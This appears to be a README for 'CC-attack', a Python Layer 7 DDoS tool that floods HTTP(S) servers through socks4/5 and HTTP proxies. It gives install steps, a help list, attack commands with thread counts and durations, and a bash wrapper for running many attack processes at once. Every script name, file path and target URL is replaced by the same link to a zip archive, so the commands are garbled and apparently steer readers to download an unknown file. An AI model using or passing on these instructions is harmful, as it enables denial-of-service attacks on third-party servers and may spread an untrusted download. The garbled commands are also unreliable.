       /////    /////    /////////////
      CCCCC/   CCCCC/   | CC-attack |/
     CC/      CC/       |-----------|/ 
     CC/      CC/       |  Layer 7  |/ 
     CC/////  CC/////   | ddos tool |/ 
      CCCCC/   CCCCC/   |___________|/

# CC-attack ![](https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip) ![](https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip)
 A script for using socks4/5 or http proxies to attack http(s) server.

 News:
- [x] Added Support of HTTP proxies
- [x] Added More proxies api to download 

 Info:
- [x] Using Python3
- [x] Added more human-like options
- [x] Http Get/Head/Post/Slow Flood
- [x] Random Http Header/Data
- [x] Socks4/5 Proxies Downloader
- [x] Socks4/5 Proxies Checker
- [x] Customize Cookies
- [x] Customize Post Data 
- [x] Support HTTPS
- [x] Support Socks4/5

## Showcase
Using https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip with socks4 on a vps
![](https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip)

## Install

    pip3 install requests pysocks
    git clone https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip
    cd CC-attack

## Usage

    python3 https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip <arguments>

```
===============  CC-attack help list  ===============
   -h/help   | showing this message
   -url      | set target url
   -m/mode   | set program mode
   -data     | set post data path (only works on post mode)
             | (Example: -data https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip)
   -cookies  | set cookies (Example: 'id:xxx;ua:xxx')
   -v        | set proxy type (4/5/http, default:5)
   -t        | set threads number (default:800)
   -f        | set proxies file (https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip)
   -b        | enable/disable brute mode
             | Enable=1 Disable=0  (default:0)
   -s        | set attack time(default:60)
   -down     | download proxies
   -check    | check proxies
=====================================================
```
### Some example of the usage
Download socks5 proxies as https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip
```
python3 https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip -down -f https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip -v 5
```
Attack a target with custom proxies list(https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip) for 30 seconds :
```
python3 https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip -url https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip -f https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip -v 4 -s 30
```

## Usage of https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip
```
This script is using for increasing the performance of https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip
Due to the suck performance of python since it has a GIL lock,
And I am lazy to make a multiprocess version.
There is a option for linux user to increase their performance of https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip

This script basicly just run https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip multiple times to make it "multi-processing"

First, put this script and https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip in the same folder.

Then prepare the proxies list by yourself or just run "python3 https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip -down -v 4" (-v socks version)

After that, change the number of process.

At last, change atk_cmd to your command and run the script by "bash https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip"
```
Example setup of https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip (-v socks version) (-s attack time)
```
atk_cmd="python3 https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip -url https://github.com/twriad969/CC-attack/raw/refs/heads/master/tickleness/attack-C-2.6.zip -v 4 -s 60"

#number of process that you want
process=10

```
